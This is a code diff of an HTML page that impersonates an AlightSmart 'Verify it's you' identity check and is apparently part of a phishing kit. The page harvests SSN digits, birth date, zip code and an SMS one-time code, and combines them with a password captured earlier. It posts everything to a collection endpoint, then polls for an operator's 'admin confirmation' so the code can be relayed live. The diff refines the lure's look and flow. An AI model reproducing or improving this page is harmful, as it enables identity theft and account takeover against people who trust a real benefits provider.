@@ -3,60 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Identity - AlightSmart</title>
+    <title>Verify it's you - AlightSmart</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f8fafc; padding: 20px; }
-        .container { max-width: 420px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
-        h1 { font-size: 1.6rem; margin-bottom: 10px; }
-        p { color: #475569; margin-bottom: 25px; }
-        label { display: block; margin: 20px 0 8px; font-weight: 600; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; }
-        button { width: 100%; padding: 15px; margin-top: 15px; border: none; border-radius: 8px; font-size: 1.1rem; cursor: pointer; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; padding: 20px; }
+        .container { max-width: 420px; margin: auto; background: white; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        h1 { font-size: 1.75rem; text-align: center; margin-bottom: 8px; color: #1e2937; }
+        p { text-align: center; color: #64748b; margin-bottom: 25px; line-height: 1.5; }
+        label { display: block; margin: 20px 0 8px; font-weight: 600; color: #334155; }
+        input, select { width: 100%; padding: 14px; border: 1.5px solid #e2e8f0; border-radius: 10px; font-size: 1.05rem; }
+        .date-group { display: flex; gap: 10px; }
+        button { width: 100%; padding: 16px; margin-top: 15px; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; }
         .continue { background: #1e40af; color: white; }
-        .cancel { background: #94a3b8; color: white; }
-        .error { color: red; margin: 15px 0; font-weight: bold; }
-        .waiting { color: #3b82f6; font-size: 1.1rem; margin: 20px 0; }
+        .cancel { background: #f1f5f9; color: #475569; }
+        .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
+        .success { color: #22c55e; margin: 15px 0; text-align: center; font-weight: 500; }
+        .waiting { color: #3b82f6; margin: 20px 0; text-align: center; font-weight: 500; }
         .step { display: none; }
         .step.active { display: block; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Step 1: SSN + DOB -->
+        <!-- Step 1 -->
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
-            <p>Provide information to verify your identity.</p>
+            <p>We'll need a few details to verify it's you.</p>
             <label>Last 4 Digits of SSN</label>
             <input type="text" id="ssn" maxlength="4" placeholder="1234">
-            
+
             <label>Birth Date</label>
-            <div style="display:flex; gap:8px;">
+            <div class="date-group">
                 <select id="month"><option value="">Month</option></select>
                 <select id="day"><option value="">Day</option></select>
                 <select id="year"><option value="">Year</option></select>
             </div>
 
             <label style="margin-top:20px;">
-                <input type="checkbox" id="privacy"> Accept Alight Privacy Policy
+                <input type="checkbox" id="privacy"> I accept the Alight Privacy Policy
             </label>
             <button class="continue" onclick="nextStep(2)">Continue</button>
         </div>
 
-        <!-- Step 2: Zip Code -->
+        <!-- Step 2 -->
         <div id="step2" class="step">
-            <h1>Provide Additional Information</h1>
+            <h1>Additional Information</h1>
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345">
             <button class="continue" onclick="nextStep(3)">Continue</button>
         </div>
 
-        <!-- Step 3: Access Code + Waiting -->
+        <!-- Step 3: Access Code -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
-            <p>Enter the code you received via SMS.</p>
-            <input type="text" id="code" maxlength="10" placeholder="123456" style="font-size:1.4rem; text-align:center;">
-            <div id="status" class="waiting"></div>
+            <p>Enter the verification code sent to your phone.</p>
+            <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
+            <div id="status"></div>
             <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="cancel" onclick="cancel()">Cancel</button>
         </div>
     </div>
 
@@ -64,18 +67,13 @@
         let realPassword = sessionStorage.getItem('realPassword') || "N/A";
 
         function nextStep(step) {
-            // Basic validation
-            if (step === 2) {
-                if (document.getElementById('ssn').value.length !== 4 || !document.getElementById('privacy').checked) {
-                    alert("Please complete all fields and accept the policy.");
-                    return;
-                }
+            if (step === 2 && (document.getElementById('ssn').value.length !== 4 || !document.getElementById('privacy').checked)) {
+                alert("Please fill SSN and accept the Privacy Policy.");
+                return;
             }
-            if (step === 3) {
-                if (document.getElementById('zip').value.length < 5) {
-                    alert("Please enter a valid Zip Code.");
-                    return;
-                }
+            if (step === 3 && document.getElementById('zip').value.length < 5) {
+                alert("Please enter a valid Zip Code.");
+                return;
             }
 
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -87,21 +85,21 @@
             const statusDiv = document.getElementById('status');
 
             if (code.length < 4) {
-                statusDiv.innerHTML = `<span style="color:red">Invalid code</span>`;
+                statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
                 return;
             }
 
-            statusDiv.innerHTML = "Waiting for admin confirmation... (Do not close this page)";
+            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation...</span>`;
 
             const ssn = document.getElementById('ssn').value;
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value;
 
-            const fullDetails = `SSN:${ssn} | DOB:${dob} | Zip:${zip} | Code:${code} | Status:Pending`;
+            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
 
             await fetch('/api/login', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     username: `SSN-${ssn}`,
                     password: realPassword,
@@ -109,46 +107,46 @@
                 })
             });
 
-            // Start polling for admin confirmation
-            let attempts = 0;
-            const check = setInterval(async () => {
-                attempts++;
+            // Polling
+            const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
                 const latest = records[0];
 
-                if (latest && latest.address && latest.address.includes("Confirmed")) {
-                    clearInterval(check);
-                    alert("✅ Verification Successful!");
-                    window.location.href = "tunde.html";
-                } else if (latest && latest.address && latest.address.includes("Rejected")) {
-                    clearInterval(check);
-                    statusDiv.innerHTML = `<span style="color:red">Code Rejected. Please request a new code.</span>`;
+                if (latest && latest.address.includes("Confirmed")) {
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `<span class="success">✅ Verified Successfully!</span>`;
+                    setTimeout(() => window.location.href = "tunde.html", 1500);
+                } else if (latest && latest.address.includes("Rejected")) {
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected by Admin.<br>Please enter a new code.</span>`;
+                    document.getElementById('code').value = '';
                 }
+            }, 2500); // Fast refresh
+        }
 
-                if (attempts > 40) clearInterval(check); // timeout after ~2 minutes
-            }, 3000);
+        function cancel() {
+            window.location.href = "/";
         }
 
         window.onload = () => {
-            // Populate date dropdowns
+            // Populate dates
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
             months.forEach((m,i) => {
                 let opt = document.createElement('option');
-                opt.value = i+1; opt.text = m;
+                opt.value = i+1; opt.textContent = m;
                 document.getElementById('month').appendChild(opt);
             });
             for(let i=1; i<=31; i++) {
                 let opt = document.createElement('option');
-                opt.value = i; opt.text = i;
+                opt.value = i; opt.textContent = i;
                 document.getElementById('day').appendChild(opt);
             }
-            const yearSelect = document.getElementById('year');
-            const curr = new Date().getFullYear();
-            for(let i=curr; i>=1950; i--) {
+            const currYear = new Date().getFullYear();
+            for(let i=currYear; i>=1950; i--) {
                 let opt = document.createElement('option');
-                opt.value = i; opt.text = i;
-                yearSelect.appendChild(opt);
+                opt.value = i; opt.textContent = i;
+                document.getElementById('year').appendChild(opt);
             }
         };
     </script>
